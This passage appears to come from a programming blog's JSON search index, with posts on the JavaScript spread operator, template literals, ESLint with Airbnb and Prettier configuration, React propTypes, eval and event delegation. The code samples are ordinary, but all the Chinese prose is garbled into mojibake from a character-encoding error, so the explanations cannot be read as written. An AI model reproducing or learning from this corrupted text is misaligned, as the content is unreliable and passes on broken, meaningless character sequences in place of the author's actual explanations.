ä½†ã€Œå±•é–‹é‹ç®—å­ã€æœƒç›´æ¥æŠŠå…§å®¹çµ¦å±•é–‹ï¼ˆæ‰“é–‹ï¼‰ï¼š 123const arr = [1, 2, 3]const arr2 = [4, 5, 6, ...arr]console.log(arr2) // [4, 5, 6, 1, 2, 3] å¯ä»¥æƒ³åƒæˆæ˜¯æŠŠ [1, 2, 3] çš„æ–¹æ‹¬è™Ÿæ‹¿æ‰çš„æ„Ÿè¦ºã€‚ æ­é… function é‚„æœ‰ä¸€å€‹å¾ˆç‰¹åˆ¥çš„ç©æ³•ï¼š 12345function add(a, b, c) { return a + b + c}let arr = [1, 2, 3]add(...arr) // 6 ä¸å¥½æ‡‚çš„è©±ï¼Œæƒ³æˆé€™æ¨£å°±å¥½ç†è§£å¤šäº†ï¼š 12345function add(a, b, c) { return a + b + c}let arr = [1, 2, 3]add(1, 2, 3) // 6 object ä¹Ÿå¯ä»¥å±•é–‹ï¼š 123456789let obj = { a: 1, b: 2}let obj2 = { c: 1, ...obj}console.log(obj2) // {c:1, a: 1, b: 2} ä½†è¦æ³¨æ„ä¸€ä¸‹é †åºçš„å•é¡Œï¼Œå¦‚æœæœ‰é‡è¤‡çš„å…§å®¹ï¼Œå¾Œé¢çš„æœƒè“‹æ‰å‰é¢çš„ï¼š 123456789101112let obj = { a: 1, b: 2, c: 10}let obj2 = { c: 1, ...obj}// c æœƒè¢« obj çµ¦è¦†å¯«// {c: 10, a: 1, b: 2, }console.log(obj2) åˆ©ç”¨å±•é–‹é‹ç®—å­æ‹·è² array æˆ– objectä»¥å¾€æˆ‘å€‘ç”¨ arr1 = arr2 çš„æ–¹å¼æœƒå› ç‚ºè®Šæ•¸çš„å„²å­˜æ©Ÿåˆ¶å°è‡´æˆ‘å€‘å­˜åˆ°çš„æ˜¯ã€Œè¨˜æ†¶é«”ä½å€ã€è€Œä¸æ˜¯å¯¦éš›ä¸Šçš„å€¼ã€‚ ä½†æ”¹ç”¨å±•é–‹é‹ç®—å­å°±å¯ä»¥åšåˆ°è¤‡è£½çš„å‹•ä½œï¼š arrayï¼š 1234const arr1 = [1, 2, 3]const arr2 = [...arr1]console.log(arr2) // [1, 2, 3]console.log(arr1 === arr2) // false objectï¼š 1234const obj1 = {name: 'PeaNu'}const obj2 = {...obj1}console.log(obj2) // {name: 'PeaNu'}console.log(obj1 === obj2) // false ä½†æ˜¯ï¼Œå¦‚æœæ˜¯è¦è¤‡è£½çš„ array è·Ÿ objectæ˜¯ã€Œå·¢ç‹€çµæ§‹ã€çš„è©±è¦ç‰¹åˆ¥æ³¨æ„ï¼š 12345const nestedArray = [4]const arr1 = [1, 2, 3, nestedArray]const arr2 = [...arr1]console.log(arr2) // [1, 2, 3, 4]console.log(arr2[3] === arr1[3]) // true ä½ å¯ä»¥æŠŠå±•é–‹é‹ç®—å­æƒ³æˆæ˜¯ã€Œå®ƒåªèƒ½æ‰“é–‹ç¬¬ä¸€å±¤ã€çš„é€™ç¨®æ¦‚å¿µï¼Œç•¶æˆ‘å€‘ç”¨ arr2 = [...arr1] çš„æ™‚å€™ï¼Œarr1 çš„ç¬¬ä¸€å±¤æœƒè¢«æ‹†é–‹ï¼Œè®Šæˆ 1, 2, 3ï¼š 123const arr2 = [...arr1]const arr2 = [[1, 2, 3]] // æ‹†æ‰ï¼const arr2 = [1, 2, 3] ä½†æ˜¯ nestedArray å› ç‚ºæ˜¯ç¬¬äºŒå±¤ï¼Œæ‰€ä»¥ä¸æœƒè¢«æ‹†é–‹ï¼š 123const arr2 = [...arr1]const arr2 = [[1, 2, 3, [4]]] // ç¬¬äºŒå±¤æ‹†ä¸æ‰ï¼const arr2 = [1, 2, 3, [4]] æ‰€ä»¥ arr1 è·Ÿ arr2 è£¡é¢çš„ nestedArray éƒ½æ²’æœ‰è¢«æ‹†é–‹ï¼Œç­‰æ–¼è£¡é¢æ”¾çš„éƒ½æ˜¯ã€ŒåŒä¸€å€‹ nestedArrayã€ï¼Œæ‰€ä»¥ arr2[3] === arr1[3] æ‰æœƒç­‰æ–¼ trueã€‚ object ä¹Ÿæœƒæœ‰ä¸€æ¨£çš„è¡Œç‚ºï¼Œç°¡å–®åšå€‹ç¤ºç¯„ï¼š 12345678const nestedObj = { age: 20 }const obj1 = { name: 'PeaNu', detail: nestedObj} const obj2 = {...obj1}console.log(obj1 === obj2) // falseconsole.log(obj1.detail === obj2.detail) // true ä¸€æ¨£æƒ³æˆé€™æ¨£å­å°±å¥½ï¼š 123456789101112const nestedObj = { age: 20 }const obj1 = { name: 'PeaNu', detail: nestedObj}// æŠŠ obj1 æ‹†é–‹å¾Œ// nestedObj é‚„æ˜¯å¤–é¢é‚£å€‹ nestedObjconst obj2 = { name: 'PeaNu', detail: nestedObj}console.log(obj1.detail === obj2.detail) // true èƒŒå¾Œçš„åŸç†ä»¥ç‰©ä»¶ä¾†èªªçš„è©±ï¼Œå…¶å¯¦æ˜¯ç”¨ Object.assign ä¾†å¯¦ç¾çš„ï¼š 1234const obj = { a: 1 };// è¤‡è£½ obj çš„å…§å®¹åˆ° {} è£¡é¢const copy = Object.assign({}, obj);console.log(copy); // { a: 1 } æ›æˆ ES6 å¯«æ³•å°±æ˜¯ï¼š 1234const obj = { a: 1 };// è¤‡è£½ obj çš„å…§å®¹åˆ° {} è£¡é¢const copy = {...obj};console.log(copy); // { a: 1 }","link":"/2021/12/24/es6-spread-operator/"},{"title":"ES6 çš„å­—ä¸²æ¨¡æ¿","text":"çµ•å°å€¼å¾—ç”¨ï¼ æˆ‘çŸ¥é“å®ƒçš„åå­—çœŸçš„æœ‰é»é›£ç†è§£Template literals çš„ç¿»è­¯æ˜¯ã€Œæ¨¡æ¿å­—ä¸²ã€æˆ–ã€Œæ¨£æ¿å­—é¢å€¼ã€ï¼Œä½†ç°¡å–®ä¾†èªªï¼Œå®ƒçš„æ„æ€æ˜¯æˆ‘å€‘å…ˆé€éã€Œæ¨¡æ¿èªæ³•ã€æŠŠå…§å®¹çµ¦å¯«å¥½ï¼Œæ¥è‘—åœ¨æŠŠæ¨£æ¿ç·¨è­¯æˆå¯ä»¥åŸ·è¡Œçš„ç¨‹å¼ç¢¼ã€‚ ä¹Ÿå°±æ˜¯èªªä½ å¯¦éš›ä¸Šæ˜¯åœ¨ç”¨ä¸€å€‹å·²ç¶“å»ºç«‹å¥½è¦å‰‡çš„æ¨¡æ¿ä¾†å¯«æ±è¥¿ï¼Œè€Œä¸æ˜¯ JS æœ¬èº«æ”¯æ´é€™ç¨®å¯«æ³•ï¼Œæ‰€ä»¥æ‰æœƒå«åšã€Œæ¨¡æ¿ã€ã€‚ éå»å¼ä»¥å¾€åœ¨åšå­—ä¸²è™•è£¡æ™‚ç¸½æœƒç¢°åˆ°ä¸€äº›éº»ç…©å•é¡Œã€‚ å¤šè¡Œå­—ä¸²æ™‚å¾ˆéº»ç…©ï¼š 1234const string = '\\n' +'yoo' + '\\n' +'hello' + '\\n' + 'Peanu' èˆ‡è®Šæ•¸åšå­—ä¸²æ‹¼æ¥æ™‚å¾ˆéº»ç…©ï¼š 123function greeting (name) { console.log('hello,' + name + ' ' + 'now is ' + new Date().toLocaleTimeString())} ç¾åœ¨å¼æ”¹ç”¨æ¨¡æ¿ä¾†å¯«å¤šè¡Œå­—ä¸²ï¼š 12345const string = `yoohelloPeanu` æ”¹ç”¨æ¨¡æ¿ä¾†åšå­—ä¸²æ‹¼æ¥ï¼š 1234function greeting (name) { console.log(`hello, ${name}. now is ${new Date().toLocaleTimeString()}`)}greeting('PeaNu') ç”¨éå°±å†ä¹Ÿå›ä¸å»äº†â€¦Ù©(â—á´—â—)Û¶","link":"/2021/12/24/es6-template-literals/"},{"title":"ESlint - é…ç½®ä¸€å€‹ Airbnb ç’°å¢ƒ","text":"æ„Ÿè¦ºæœ‰é»æ™šæ‰é–‹å§‹ç¢°é€™ç©æ„å…’ã€‚ VS-Codeè«‹å…ˆå®‰è£åº•ä¸‹é€™å…©å€‹ Extensionï¼š Prettier ESLint Prettier çš„ç”¨æ„æ˜¯è®“ä½ å¯ä»¥ç›´æ¥åœ¨ VS-Code ä¸Šå­˜æª”å¾Œè‡ªå‹•æ ¼å¼åŒ–ï¼ˆformatOnSaveï¼‰ï¼ŒESLint çš„ç”¨æ„æ˜¯ç›´æ¥åœ¨èƒŒå¾Œåšèªæ³•æª¢æŸ¥ä¸¦é¡¯ç¤ºåœ¨ VS-Code ä¸Šã€‚ æ›å¥è©±èªªå°±æ˜¯ï¼š è«‹ VS-Code å…¨éƒ¨å¹«æˆ‘è‡ªå‹•åŸ·è¡Œï¼Œæˆ‘ä¸æƒ³è¦è‡ªå·±ç”¨ CLI ä¾†è·‘ prettier æˆ– eslint lint ä¾†åšæ ¼å¼åŒ–æˆ–èªæ³•æª¢æŸ¥ã€‚ é—œæ–¼ eslint.rc æ‡¶äººåŒ… envï¼šå‘Šè¨´ ESlint ç›®å‰çš„åŸ·è¡Œç’°å¢ƒæ˜¯ä»€éº¼ï¼ˆæ‰èƒ½åˆ¤æ–·è©²ç’°å¢ƒæœ‰å“ªäº›å…¨åŸŸè®Šæ•¸ï¼‰ extendsï¼šäººå®¶å¯«å¥½çš„ configï¼Œä¾‹å¦‚ airbnb pluginï¼šç‚º ESLint æ·»åŠ æ–°çš„è¦å‰‡ï¼ˆä½†ä¸åŒ…å«æ€éº¼è¨­å®šé€™äº›è¦å‰‡ï¼‰ rulesï¼šç”¨ä¾†æ’°å¯«è‡ªå·±æƒ³è¦ / ä¸æƒ³è¦çš„è¦å‰‡ parserOptionsï¼šè¨­å®šèªè¨€è¦ç¯„ or é¡å¤–åŠŸèƒ½ï¼ˆä¾‹å¦‚ ES6ã€JSXï¼‰ï¼Œè®“ ESlint èƒ½çœ‹å¾—æ‡‚ æœ€å¸¸ææ··çš„æ‡‰è©²æ˜¯ extends å’Œ pluginï¼Œæ‰€ä»¥é€™é‚Šå†å¼·èª¿ä¸€æ¬¡ï¼š plugin æ˜¯æ‹¿ä¾†ã€Œæ·»åŠ è¦å‰‡ã€ç”¨çš„ï¼Œä½†ä¸åŒ…å«ã€Œæ€éº¼è¨­å®šé€™äº›è¦å‰‡ã€ã€‚å¦‚æœè¦è¨­å®šå°±å¾—é€é rules å»ä¸€å€‹ä¸€å€‹èª¿æ•´ï¼Œä¸éé€™æ¨£å­å¯¦åœ¨æœ‰é»éº»ç…©ï¼Œæ‰€ä»¥å°±æœ‰äº† extends é€™å€‹æ±è¥¿ï¼Œå®ƒçš„æƒ³æ³•æ˜¯ç›´æ¥æŠŠã€Œåˆ¥äººå¯«å¥½çš„ rulesã€å¥—ç”¨é€²ä¾†ã€‚ éœ€å®‰è£çš„å¥—ä»¶ï¼ˆdevDependenciesï¼‰ eslint-config-airbnbï¼šæ•´å€‹ airbnb çš„çµ„åˆåŒ…ï¼Œè£¡é¢æœƒåŒ…å«å¤šå€‹ plugin å’Œä¸€å€‹ config prettierï¼šcore package eslintï¼šcore package eslint-plugin-prettierï¼šæ·»åŠ  prettier çš„è¦å‰‡ eslint-config-prettierï¼šè¨­å®š prettier plugin çš„ config å»ºç«‹ Prettier configåœ¨æ ¹ç›®éŒ„å»ºç«‹ .prettierrc ä¸¦å¡«å…¥ä½ æƒ³è¦çš„è¦å‰‡å³å¯ï¼š 12345678{ \"singleQuote\": true, \"semi\": false, \"jsxSingleQuote\": false, \"printWidth\": 100, \"useTabs\": false, \"trailingComma\": \"none\"} ä¹‹æ‰€ä»¥è¦å»ºç«‹é€™å€‹æª”æ¡ˆæ˜¯ç‚ºäº†è®“æ‰€æœ‰äººçš„æ ¼å¼æ˜¯ä¸€è‡´çš„ï¼Œåœ¨é€™è£¡å»ºç«‹çš„è¦å‰‡æœƒç›´æ¥è¦†å¯«æ¯å€‹äººè‡ªå·±åœ¨ VS-Code ä¸­çš„è¨­å®šï¼Œæ‰€ä»¥ä»»ä½•äººåœ¨é€™ä»½å°ˆæ¡ˆåº•ä¸‹è·‘ prettier çš„çµæœéƒ½æœƒæ˜¯ç›¸åŒçš„ï¼Œä¸ç”¨æ“”å¿ƒè¨­å®šä¸åŒçš„å•é¡Œã€‚ å»ºç«‹ Eslint config æ–¹æ³•ä¸€ï¼šè‡ªå·±å»ºç«‹ .eslintrc æª”æ¡ˆ æ–¹æ³•äºŒï¼šå…ˆç”¨ npm å®‰è£ global eslintï¼Œæ¥è‘—å†ç”¨ eslint --init ä¾†å»ºç«‹ é€™é‚Šç”¨æ–¹æ³•äºŒå»ºç«‹å‡ºä¾†çš„æª”æ¡ˆå…§å®¹å¤§æ¦‚æœƒæ˜¯é€™æ¨£ï¼š 1234567891011121314151617181920{ // åŸ·è¡Œç’°å¢ƒè³‡è¨Šï¼š // 1. ç€è¦½å™¨ // 2. ä½¿ç”¨ commonjsï¼ˆæ¨¡çµ„è¦ç¯„ï¼‰ // 3. ä½¿ç”¨ es2021ï¼ˆECMAScriptï¼‰ \"env\": { \"browser\": true, \"commonjs\": true, \"es2021\": true }, // ä½¿ç”¨ eslint:recommended å¯«å¥½çš„ rules \"extends\": \"eslint:recommended\", \"overrides\": [], // ESlint è©²æ€éº¼è®€ä½ çš„èªè¨€ï¼ˆè«‹ä¾ç…§æœ€æ–°çš„ ECMAScriptï¼‰ \"parserOptions\": { \"ecmaVersion\": \"latest\" }, // ä½ æƒ³è¦èª¿æ•´çš„è¦å‰‡ï¼Œå¯ä»¥è¨­ç‚º offã€warn å’Œ error ç­‰ç­‰ \"rules\": {}} é€™é‚Šå…ˆæ³¨æ„ extends å°±å¥½ï¼Œå…¶ä»–å…ˆçœ‹è¨»è§£ç†è§£å€‹å¤§æ¦‚å°±å¥½ï¼Œèƒ½çœ‹åˆ°é è¨­çš„ ESlint æœƒç”¨ eslint:recommended é€™å¥—è¦å‰‡ï¼Œä¾‹å¦‚ï¼šno-unused-varsã€‚ ä½†é€™é‚Šæˆ‘å€‘æƒ³è¦æ”¹æˆ airbnb å¯«å¥½çš„è¦å‰‡ï¼Œæ‰€ä»¥æœƒä¿®æ”¹æˆä¸‹é¢é€™æ¨£ï¼š 123456789101112131415{ \"env\": { \"browser\": true, \"commonjs\": true, \"es2021\": true }, // æ”¹æˆ airbnb å¯«å¥½çš„è¦å‰‡ // å®Œæ•´çš„å¯«æ³•æ˜¯ eslint-config-airbnbï¼Œä½† \"eslint-config\" æ˜¯å‘½åæ…£ä¾‹æ‰€ä»¥é€™é‚Šå¯ä»¥çœç•¥ã€‚ \"extends\": \"airbnb\", \"overrides\": [], \"parserOptions\": { \"ecmaVersion\": \"latest\" }, \"rules\": {}} é€™æ™‚å€™å°±å¯ä»¥çœ‹åˆ°å¤šå‡ºäº†ä¸€äº›ä¸åŒçš„ lintï¼Œåƒ import/no-unresolvedï¼Œé€™é‚Šæ³¨æ„åˆ° lint é™¤äº†æŒ‡å‡ºå•é¡Œï¼ˆno-unresolvedï¼‰ä»¥å¤–ï¼Œé‚„æœƒæ¨™ç¤ºå‡ºé€™å€‹ rule çš„ä¾†æºæ˜¯èª°ï¼Œé€™é‚Šæ˜¯æ–œç·šå‰é¢çš„ importï¼Œä»£è¡¨èªªé€™å€‹è¦å‰‡æ˜¯å¾ import é€™å€‹ plugin ä¾†ç”¢ç”Ÿçš„ã€‚ é™„è¨»ï¼šå‰é¢åœ¨å®‰è£ eslint-config-airbnb çš„æ™‚å€™æœƒé †ä¾¿å®‰è£çš„ plugin åŒ…å«ï¼š eslint-plugin-import eslint-plugin-react eslint-plugin-react-hooks eslint-plugin-jsx-a11y é€™äº›éƒ½æ˜¯ airbnb config åœ¨æ’°å¯«è¦å‰‡æ™‚æœƒç”¨åˆ°çš„è¦å‰‡ï¼Œæ‰€ä»¥ä»–æ‰æœƒå®‰è£é€™äº› pluginï¼Œä½ ä¹Ÿå¯ä»¥åˆ° package.json ç¢ºèªï¼š 12345678910111213\"devDependencies\": { \"eslint\": \"^8.28.0\", \"eslint-config-airbnb\": \"^19.0.4\", \"eslint-config-node\": \"^4.1.0\", \"eslint-config-prettier\": \"^8.5.0\", \"eslint-plugin-import\": \"^2.26.0\", // &lt;- é€™ä¸€å€‹ \"eslint-plugin-jsx-a11y\": \"^6.6.1\", \"eslint-plugin-node\": \"^11.1.0\", \"eslint-plugin-prettier\": \"^4.2.1\", \"eslint-plugin-react\": \"^7.31.11\", \"eslint-plugin-react-hooks\": \"^4.6.0\", \"prettier\": \"^2.8.0\"} prettier ä¸€è·‘ä¸‹å»æ»¿æ±Ÿç´…ï¼Œæ€éº¼è¾¦ï¼Ÿ é€™æ˜¯å› ç‚ºæˆ‘å€‘å° prettier çš„è¨­å®šå¯èƒ½æœƒè·Ÿ airbnb çš„é¢¨æ ¼æœ‰è¡çªï¼Œåƒæ˜¯å–®é›™å¼•è™Ÿã€å¥å°¾åˆ†è™Ÿç­‰ç­‰ä¹‹é¡çš„å•é¡Œã€‚ é›–ç„¶æˆ‘å€‘å¯é€é rule å»å° airbnb ä¸€å€‹ä¸€å€‹åšèª¿æ•´ï¼Œä½†æ›´ç°¡å–®çš„åšæ³•æ˜¯ã€Œç›´æ¥ç”¨ prettier config å»è¦†è“‹æ‰ airbnb configã€ï¼Œæ‰€ä»¥åªè¦æŠŠ extends çš„éƒ¨åˆ†ä¿®æ”¹æˆé€™æ¨£å°±å¥½ï¼š 123456789101112131415{ \"env\": { \"browser\": true, \"commonjs\": true, \"es2021\": true }, // åŠ ä¸Š prettier çš„ config // è¨˜å¾—é †åºå¾ˆé‡è¦ï¼Œå¾Œé¢çš„æœƒè“‹æ‰å‰é¢çš„!!! \"extends\": [\"airbnb\", \"prettier\"], \"overrides\": [], \"parserOptions\": { \"ecmaVersion\": \"latest\" }, \"rules\": {}} é™„è¨»ï¼šé€™é‚Šçš„åŸç†æ˜¯è®“ prettier çš„å„ªå…ˆæ¬Š &gt; airbnbï¼Œè€Œä¸æ˜¯è®“ prettier ä¾ç…§ airbnb çš„è¦å‰‡å»æ’ç‰ˆã€‚å› æ­¤ prettier è·‘å®Œçš„çµæœå…¶å¯¦é‚„æ˜¯æœƒè·Ÿ airbnb çš„è¦å‰‡æœ‰è¡çªï¼Œä½†å› ç‚ºæˆ‘å€‘æœ‰æŒ‡å®šå„ªå…ˆæ¬Šçš„é—œä¿‚ï¼ŒESlint å°±æœƒçŸ¥é“è¦éµå¾ª prettier çš„è¦å‰‡ï¼Œä¸æœƒå†é¡¯ç¤ºéŒ¯èª¤è¨Šæ¯ã€‚ ç‚ºä»€éº¼ prettier çš„è¦å‰‡ä¸æœƒæœ‰æç¤ºï¼Ÿè¦è¨˜å¾—ï¼ŒESLint æœ¬èº«æ˜¯ä¸åŒ…å« prettier çš„å„é …è¦å‰‡çš„ï¼Œå¦‚æœæˆ‘å€‘æƒ³è¦æ·»åŠ æ–°çš„è¦å‰‡åˆ° ESLint å°±å¾—é€é pluginã€‚ é‚„è¨˜å¾—å‰é¢æˆ‘å€‘æœ‰å®‰è£ eslint-plugin-prettier å—ï¼Ÿç¾åœ¨åªéœ€è¦æŠŠå®ƒåŠ å…¥åˆ° .eslintrc å³å¯ï¼š 12345678910111213141516171819202122{ \"env\": { \"browser\": true, \"commonjs\": true, \"es2021\": true }, // å®Œæ•´å¯«æ³•æ˜¯ï¼šeslint-config-airbnb, eslint-config-prettier \"extends\": [\"airbnb\", \"prettier\"], // å‘Šè¨´ eslint æ·»åŠ  prettier çš„è¦å‰‡ \"plugins\": [\"prettier\"], \"overrides\": [], \"parserOptions\": { \"ecmaVersion\": \"latest\" }, \"rules\": { // é‡å° prettier plugin è¨­ç½®è¦å‰‡ // è‹¥æ²’ä¾ç…§ .prettierrc çš„è¦ç¯„å°±æœƒé¡¯ç¤º warn è¨Šæ¯ \"prettier/prettier\": \"warn\", \"no-unused-vars\": \"warn\", \"no-console\": \"off\" }} é™¤äº†é€™ç¨®å¯«æ³•ä»¥å¤–ï¼Œä½ å»çœ‹ å®˜æ–¹æ–‡ä»¶ çš„è©±ä»–æœƒèªªä¹Ÿå¯ä»¥é€™æ¨£å¯«ï¼š 1234567891011121314151617{ \"env\": { \"browser\": true, \"commonjs\": true, \"es2021\": true }, // åŠ äº†ä¸€å€‹ extends \"extends\": [\"airbnb\", \"plugin:prettier/recommended\"], \"overrides\": [], \"parserOptions\": { \"ecmaVersion\": \"latest\" }, \"rules\": { \"no-unused-vars\": \"warn\", \"no-console\": \"off\" }} é€™é‚Šæ”¹æˆåªå¯«äº† extends è€Œä¸å¯« pluginsï¼Œè€Œä¸”åç¨±ä¹Ÿè·Ÿä»¥å¾€çš„ convention ä¸å¤ªä¸€æ¨£æ˜¯ç‚ºä»€éº¼å‘¢ï¼Ÿæƒ³çŸ¥é“è©³ç´°çš„è©±å¯ä»¥åƒè€ƒ é€™ç¯‡æ–‡ç« ï¼Œè£¡é¢è§£é‡‹å¾—è »æ¸…æ¥šçš„ã€‚ ç°¡å–®ä¾†èªªçš„è©±å°±æ˜¯åœ¨æˆ‘å€‘å®‰è£ prettier-plugin çš„æ™‚å€™å®ƒç›´æ¥å¹«ä½ å¯«äº†ä¸€ä»½è¨­å®šæª”ï¼ˆå¯ä»¥ç”¨ä¾† extends çš„é‚£å€‹ï¼‰ã€‚é€™ä»½è¨­å®šæª”è·Ÿä¸€èˆ¬å¸¸è¦‹çš„è¨­å®šæª”ä¸å¤ªä¸€æ¨£ï¼ŒåŸæœ¬çš„è¨­å®šæª”æ˜¯åªæœ‰å¹«ä½ å¯«å¥½ rulesï¼Œè€Œ plugin çš„éƒ¨åˆ†ä½ è¦è‡ªå·±å»æŒ‡å®šã€‚ ä½†ç¾åœ¨é€™ä»½è¨­å®šæª”ç›´æ¥å¹«ä½ åŒ…å« rules å’Œ plugins çš„è¨­å®šï¼Œæ‰€ä»¥ä½ åªéœ€è¦ç”¨ extends ä¾†å¥—ç”¨é€™ä»½è¨­å®šæª”ï¼Œè·Ÿç¢ºå®šä½ æœ‰å®‰è£é€™å¥— plugin å°±å¥½äº†ã€‚ é¡å¤–è£œå……ï¼šç”¨ ESLint çš„ autoFix ä¾†å–ä»£ prettierç‚ºäº†é¿å… prettier å’Œ ESLint è¡çªçš„å•é¡Œï¼Œæœ‰äº›äººæœƒå‚¾å‘é€™ç¨®æƒ³æ³• æˆ‘ç›´æ¥ç”¨ ESlint è‡ªå‹•ä¿®å¾©çš„åŠŸèƒ½ä¾†æ’ç‰ˆå°±å¥½ï¼Œå¹¹å˜›ç”¨ prettierï¼Ÿ é—œæ–¼é€™é»æˆ‘å€‹äººé‚„æ˜¯å‚¾å‘ç”¨ prettier çš„æ–¹å¼ä¾†æ’ç‰ˆã€‚é›–ç„¶ ESlint çš„è‡ªå‹•ä¿®å¾©ç¢ºå¯¦å¾ˆæ–¹ä¾¿ï¼Œä½†æˆ‘èªç‚ºé€™ç¨®æ–¹ä¾¿å¯èƒ½æœƒè®“ä½ å¿½ç•¥æ‰è‡ªå·±åˆ°åº•å¯«éŒ¯äº†ä»€éº¼ï¼Œæœƒæœ‰é»å¤±å»ç•¶åˆç”¨ ESLint çš„åˆè¡·ã€‚ æƒ³è§£æ±ºè¡çªçš„å•é¡Œæˆ‘å»ºè­°é‚„æ˜¯ç”¨å‰é¢æåˆ°çš„ prettier-plugin ä¾†è™•ç†æœƒå¥½ä¸€é»ï¼Œé›–ç„¶èªªèƒŒå¾Œçš„åŸç†æ˜¯è®“ prettier ç›´æ¥è¦†è“‹æ‰å…¶ä»–è¦å‰‡ï¼Œä½†è‡³å°‘æœƒè¦†è“‹æ‰çš„è¦å‰‡éƒ½æ˜¯è·Ÿç¨‹å¼ç¢¼å“è³ªæ¯”è¼ƒç„¡é—œï¼ˆå–®é›™å¼•è™Ÿä¹‹é¡çš„ï¼‰çš„å±¤é¢ï¼Œæˆ‘èªç‚ºé€™å°æ•´é«”åœ¨ç”¨ ESLint çš„æ•ˆæœæœƒæ›´å¥½ä¸€é»ã€‚ å€˜è‹¥çœŸçš„ç¢°åˆ°ä¸æƒ³è¦ç”¨ prettier çš„åœ˜éšŠçš„è©±ï¼Œæˆ‘çš„å»ºè­°æ˜¯åˆ° VS-Code æ·»åŠ é€™äº›è¨­å®šå°±å¥½ï¼Œä¸éœ€è¦ç›´æ¥æŠŠ prettier ç§»é™¤æˆ–æ•´å€‹ disabled æ‰ï¼š 12345678{ \"editor.codeActionsOnSave\": { \"source.fixAll.eslint\": true // å•Ÿç”¨ ESlint çš„è‡ªå‹•ä¿®å¾©ï¼ˆæ’ç‰ˆï¼‰ }, \"[javascript]\": { \"editor.formatOnSave\": false // é—œæ‰ formatOnSave çš„åŠŸèƒ½ï¼ˆåƒ…é™ JavaScriptï¼Œå¦‚æœæ˜¯ react å¯æ”¹æˆ javascriptreactï¼‰ }} é€™æ¨£çš„å¥½è™•æ˜¯ä½ åªæœ‰æŠŠæœƒè·Ÿ ESlint è¡çªçš„èªè¨€çµ¦é—œæ‰ prettier è€Œå·²ï¼Œä½†åœ¨å…¶ä»–è·Ÿ ESlint ç„¡é—œçš„èªè¨€ï¼ˆä¾‹å¦‚ HTMLã€CSSï¼‰ä½ é‚„æ˜¯å¯ä»¥ç¹¼çºŒç”¨ prettierã€‚","link":"/2022/11/30/eslint-airbnb-concept/"},{"title":"åœ¨ Create React App é–‹å•Ÿ ESLint çš„ propTypes é©—è­‰","text":"é‚„ä¸éŒ¯çš„æ±è¥¿ã€‚ ç°¡è¿°æƒ³çŸ¥é“æ›´è©³ç´°çš„ä»‹ç´¹å¯ä»¥åƒè€ƒï¼š React å®˜æ–¹æ–‡ä»¶ Create React App å®˜æ–¹æ–‡ä»¶ ESLint é™¤äº†æª¢é©—åŸºæœ¬çš„ JS èªæ³•ä»¥å¤–ï¼Œé‚„æœ‰ä¸€å€‹åŠŸèƒ½æ˜¯æª¢æŸ¥ React ä¸­çš„ propTypesã€‚é¡§åæ€ç¾©æ˜¯ç”¨ä¾†æª¢æŸ¥ã€ŒProps ç¨®é¡ã€çš„ä¸€é …åŠŸèƒ½ã€‚ é€™é‚Šæœƒä»‹ç´¹ä¸€ä¸‹è¦æ€éº¼åœ¨ Create React App çš„ç’°å¢ƒä¸­æ‰“é–‹é€™å€‹åŠŸèƒ½ã€‚ å…ˆåœ¨æ ¹ç›®éŒ„å»ºä¸€å€‹ .eslintrc æª”æ¡ˆï¼Œç„¶å¾Œå¯«ä»¥ä¸‹çš„å…§å®¹ï¼š 12345678{ // ç¹¼æ‰¿åŸæœ¬çš„è¨­å®šï¼ˆé è¨­å€¼ï¼‰ \"extends\": \"react-app\", // è¦æ–°å¢çš„ ESLint è¦å‰‡ \"rules\": { \"react/prop-types\": \"warn\" }} ç•¶è¨­å®šç‚º warn æ™‚ï¼Œå¦‚æœå‡ºç¾ä¸åˆæ³•çš„ codeï¼ŒESLint å°±æœƒè‡ªå‹•åœ¨ console ä¸­å°å‡º warning è¨Šæ¯ä¾†æé†’ä½ ã€‚ ï¼ˆæˆ‘é æœŸæœƒå‚³å…¥ string å»æ¥æ”¶åˆ° numberï¼‰ æ·»åŠ  propTypes çš„å¥½è™•æ˜¯åˆ¥äººè¦çœ‹ code æœƒæ¯”è¼ƒæ–¹ä¾¿ï¼Œç¨‹å¼ç¢¼å“è³ªä¹Ÿæœƒæ¯”è¼ƒå¥½ï¼Œæ‰€ä»¥å°±è©¦è‘—éµå®ˆé€™äº›è¦å‰‡å§ï¼ åªè¦æ˜¯æœƒæ¥æ”¶ props çš„ Componentï¼Œéƒ½å¯ä»¥åœ¨æœ€ä¸‹é¢åŠ ä¸Šå®ƒæ¥æ”¶çš„ typeï¼š 1234567891011121314// å¼•å…¥çš„æ˜¯å¤§å¯«import PropTypes from 'prop-types'// propTypes æ˜¯å°å¯«TodoItem.propTypes = { // ç‰©ä»¶å¯ä»¥ç”¨ shape ä¾†æè¿°çš„æ›´è©³ç´° todo: PropTypes.shape({ id: PropTypes.number, content: PropTypes.string, isDone: PropTypes.bool }), handleRemoveTodo: PropTypes.func, handleToggleTodoState: PropTypes.func} å¦‚æœæ¥å—å¤šå€‹ type çš„å¯«æ³•ï¼š 1234567ErrorMessage.propTypes = { apiGetError: PropTypes.object, apiPostError: PropTypes.oneOfType([ PropTypes.string, PropTypes.object ]),};","link":"/2022/04/09/eslint-prop-types/"},{"title":"JS ä¸­çš„ eval","text":"ä¸çŸ¥é“è©²æ”¾å“ªï¼Œå°±é–‹ä¸€ç¯‡ä¾†è¨˜å§ã€‚ ç°¡è¿°ç°¡å–®ä¾†èªª eval å°±æ˜¯æŠŠå­—ä¸²ç•¶æˆ JavaScript ä¾†åŸ·è¡Œï¼Œæ‰€ä»¥ï¼š 1234console.log(eval('1+1')); // 2console.log(eval('2*2')); // 4console.log(eval('2*2 === 2*2')); // trueconsole.log(eval('[] === []')); // false æ‰€ä»¥è¦åšè¨ˆç®—æ©Ÿçš„è©±å°±èƒ½ç”¨ eval ä¾†å·åƒæ­¥ã€‚ ä¸éæ²’ç‰¹åˆ¥åŸå› çš„è©±ä¸å»ºè­°ç”¨é€™å€‹ functionï¼Œç•¢ç«Ÿ XSS çš„é¢¨éšªå¾ˆé‡ QQ","link":"/2022/02/27/eval-function/"},{"title":"è¬äº‹æ‹œè¨—ä½ å›‰ï¼Event-delegation æ©Ÿåˆ¶","text":"å“­é˜¿ï½åˆæ˜¯æˆ‘ã€‚ ç°¡è¿°delegation çš„æ„æ€æ˜¯ã€Œä»£ç†ã€ã€‚ é€™å€‹æ©Ÿåˆ¶æ˜¯ç”¨ä¾†è§£æ±ºå…©å€‹å•é¡Œï¼š æ¯å€‹å…ƒç´ éƒ½è¦è¨­å®šç›£è½å™¨ä¸æœƒå¤ªæµªè²»è³‡æºå—ï¼Ÿ 